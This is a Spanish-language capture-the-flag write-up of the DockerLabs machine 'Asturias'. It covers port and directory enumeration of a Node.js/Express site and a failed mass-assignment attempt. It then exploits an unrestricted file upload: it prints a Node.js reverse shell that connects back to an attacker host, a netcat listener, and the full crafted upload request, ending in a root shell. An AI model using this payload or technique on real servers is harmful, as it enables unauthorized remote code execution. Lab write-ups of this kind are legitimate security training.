---
title: Asturias
platform: DockerLabs
difficulty: Medium
os: Linux
releaseDate: 2026-09-27
date: 2026-10-21
publishedAt: 2026-10-21
tags: [NodeJS, Express, FileUpload, RCE, RevShell, Linux, DockerLab, Medium]
image: ./thumb.png
imageShape: square
rating: 4.4
---


---
# Descripcion

Máquina Linux de dificultad media centrada en la enumeración web y la explotación de una vulnerabilidad en la subida de archivos. A través de una aplicación desarrollada con Node.js y Express, será necesario descubrir endpoints ocultos, analizar las peticiones HTTP y conseguir ejecutar código en el servidor para obtener acceso remoto como `root`.

---

# Enumeracion

## Nmap

> Comenzamos realizando un escaneo de todos los puertos TCP para identificar cuáles se encuentran abiertos.

```bash
$ nmap -p- --open --min-rate 5000 -Pn -n -sS -v 172.17.0.2

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-20 21:37 +0200
Initiating ARP Ping Scan at 21:37
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 21:37, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:37
Scanning 172.17.0.2 [65535 ports]
Discovered open port 3000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 21:37, 0.45s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
3000/tcp open  ppp
MAC Address: 6E:37:1D:BF:61:A7 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

> Una vez identificado el puerto abierto, realizamos un segundo escaneo para detectar los servicios y sus versiones, además de ejecutar los scripts predeterminados de Nmap.

```bash
$ nmap -p3000 -sC -sV 172.17.0.2

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-20 21:37 +0200
Nmap scan report for 172.17.0.2
Host is up (0.000043s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Asturias Viajes · El Paraíso Natural te espera
|_http-cors: HEAD GET POST PUT DELETE PATCH
MAC Address: 6E:37:1D:BF:61:A7 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.09 seconds
```

> Encontramos el puerto `3000` abierto, donde se está ejecutando una aplicación web basada en `Node.js` con el framework `Express`.

## Web

> A continuación, utilizamos `WhatWeb` para identificar las tecnologías y características visibles de la aplicación web.

```bash
$ whatweb http://172.17.0.2:3000

http://172.17.0.2:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[172.17.0.2], Script, Title[Asturias Viajes · El Paraíso Natural te espera], UncommonHeaders[access-control-allow-origin], X-Powered-By[Express]
```

![Pasted-image-20261020214210.png](./Images/Pasted-image-20261020214210.png)

> Encontramos una página web relacionada con viajes a Asturias. También observamos las opciones de inicio de sesión y registro.
>
> Antes de interactuar con la aplicación, vamos a utilizar `Gobuster` para intentar descubrir directorios y archivos que puedan resultar interesantes.

```bash
$ gobuster dir -u http://172.17.0.2:3000 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 100 -x php,html,txt,js -xl 6327
```

![Pasted-image-20261020214910.png](./Images/Pasted-image-20261020214910.png)

> No encontramos nada relevante durante esta enumeración. Por tanto, vamos a registrarnos en la aplicación.
>
> Interceptamos la petición de registro con `Burp Suite` y observamos que se envía al endpoint `/api/auth/register`.

![Pasted-image-20261020215350.png](./Images/Pasted-image-20261020215350.png)

> En la respuesta aparece el campo `role`. Vamos a comprobar si es posible modificarlo en la petición de registro para intentar explotar una vulnerabilidad de tipo **Mass Assignment**, que podría permitirnos asignar un rol diferente al predeterminado.

![Pasted-image-20261020215810.png](./Images/Pasted-image-20261020215810.png)

> El intento no funciona: la aplicación sigue asignándonos el rol `user`.
>
> Una vez dentro del `dashboard`, observamos que la aplicación realiza varias peticiones a diferentes endpoints de la API.

![Pasted-image-20261020220902.png](./Images/Pasted-image-20261020220902.png)

> Vamos a ejecutar `Gobuster` contra la ruta `/api` para intentar descubrir endpoints adicionales que puedan resultar interesantes.

```bash
$ gobuster dir -u http://172.17.0.2:3000/api -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 100
```

![Pasted-image-20261020221148.png](./Images/Pasted-image-20261020221148.png)

> A continuación, enumeramos el endpoint `/api/gallery`. Mediante peticiones `GET` no encontramos nada relevante, pero al utilizar el método `POST` descubrimos la ruta `upload`.

```bash
$ gobuster dir -u http://172.17.0.2:3000/api/gallery -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 100 -m POST
```

![Pasted-image-20261020223017.png](./Images/Pasted-image-20261020223017.png)

> Podemos acceder a este endpoint desde la sección `Galería`, disponible en el menú de navegación de la aplicación.

![Pasted-image-20261021013756.png](./Images/Pasted-image-20261021013756.png)

# Explotacion

> Vamos a subir una imagen de prueba e interceptar la petición con `Burp Suite` para analizar cómo gestiona la aplicación los archivos enviados.

![Pasted-image-20261021014050.png](./Images/Pasted-image-20261021014050.png)

> Después de subir la imagen, observamos que la aplicación nos devuelve una ruta desde la que podemos acceder al archivo.
>
> También podemos visualizarlo desde la sección de galería y acceder directamente a él mediante la siguiente URL:

```text
http://172.17.0.2:3000/api/gallery/<ID>/file
```

> En este caso, el identificador de la imagen de prueba es `22`.
>
> Ahora vamos a comprobar si es posible explotar una vulnerabilidad de tipo **Arbitrary File Upload**. Para ello, intentaremos subir un archivo JavaScript que, si se ejecuta en el servidor, nos permita obtener una shell inversa.

> [!NOTE]
> El siguiente código utiliza los módulos `net` y `child_process` de Node.js para establecer una conexión TCP con nuestra > máquina y redirigir la entrada y salida de una shell a través de ella.

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(7777, "172.17.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

> Este será el código que enviaremos. Primero, ponemos en escucha nuestra máquina para recibir la conexión entrante.

```bash
$ nc -nvlp 7777
```

> A continuación, preparamos la petición HTTP mediante `Burp Suite`, modificando la solicitud de subida de archivos para enviar nuestro archivo JavaScript.

```http
POST /api/gallery/upload HTTP/1.1
Host: 172.17.0.2:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2:3000/galeria.html
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjU0LCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsIm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzkyNTI1OTY0LCJleHAiOjE3OTI1NTQ3NjR9.FD29HJclRrCon6i-AJSVpAoGRSCKLI4kPekKWJ5PPc0
Content-Type: multipart/form-data; boundary=----geckoformboundarya54e2a7c39f4b15dc2579da842d33af
Content-Length: 707
Origin: http://172.17.0.2:3000
Connection: keep-alive
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjU0LCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsIm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzkyNTI1OTY0LCJleHAiOjE3OTI1NTQ3NjR9.FD29HJclRrCon6i-AJSVpAoGRSCKLI4kPekKWJ5PPc0
Priority: u=0

------geckoformboundarya54e2a7c39f4b15dc2579da842d33af
Content-Disposition: form-data; name="caption"

aa
------geckoformboundarya54e2a7c39f4b15dc2579da842d33af
Content-Disposition: form-data; name="photo"; filename="test.js"
Content-Type: image/png

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(7777, "172.17.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

------geckoformboundarya54e2a7c39f4b15dc2579da842d33af--
```

![Pasted-image-20261021014947.png](./Images/Pasted-image-20261021014947.png)

> Enviamos la petición y comprobamos que la aplicación nos devuelve el identificador `24` para el archivo subido.
>
> Por tanto, vamos a acceder al recurso correspondiente mediante la siguiente URL:

```text
http://172.17.0.2:3000/api/gallery/24/file
```

> Finalmente, comprobamos el resultado en el listener de `Netcat`.

![Pasted-image-20261021015153.png](./Images/Pasted-image-20261021015153.png)

> Hemos conseguido acceso al sistema con el usuario `root`, completando así la explotación de la máquina `Asturias`.